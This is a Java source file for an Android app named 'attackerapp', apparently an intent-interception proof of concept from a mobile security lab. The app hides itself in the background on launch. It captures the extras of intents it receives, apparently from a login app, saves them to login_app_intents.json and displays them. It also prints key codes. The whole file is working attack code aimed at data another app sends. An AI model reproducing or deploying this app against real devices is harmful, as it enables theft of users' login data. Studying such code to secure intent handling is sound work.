package com.zombie.attackerapp;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.widget.TextView;

import org.json.JSONException;
import org.json.JSONObject;

public class MainActivity extends AppCompatActivity {
    boolean bundleRecieved = false;
    String bundleString = "None";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        moveTaskToBack(true);
    }

    @Override
    public void onResume(){
        super.onResume();
        setContentView(R.layout.activity_main);
        if(bundleRecieved) {
            final TextView status = (TextView)findViewById(R.id.bundle_status);
            final TextView data = (TextView) findViewById(R.id.bundle_data);
            status.setText("Bundle Data Recieved");
            data.setText(bundleString + "\n\nStored: Device File Explorer/data/data/com.example.attackerapp/files/login_app_intents.json");
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        Bundle b = intent.getExtras();

        if (b != null) {
            bundleRecieved = true;
            try {
                JSONObject bundleJSON = Utils.bundleToJSON(b);
                //WRITE TO FILES DIR
                Utils.writeJSONToFilesDir(getApplicationContext(), "login_app_intents.json", bundleJSON);

                bundleString = bundleJSON.toString(4);

            } catch(JSONException e) {
                Log.i("IntentRecived", "JSON Exception");
            }
            //DEVICE FILE EXPLORER => DATA => DATA => COM.EXAMPLE.ATTACKERAPP => FILES => login_app_intents.json
        }
    }

   @Override
    public boolean onKeyDown(int key, KeyEvent keyEvent){
        System.out.println(keyEvent.getKeyCode());
        return false;
    }
}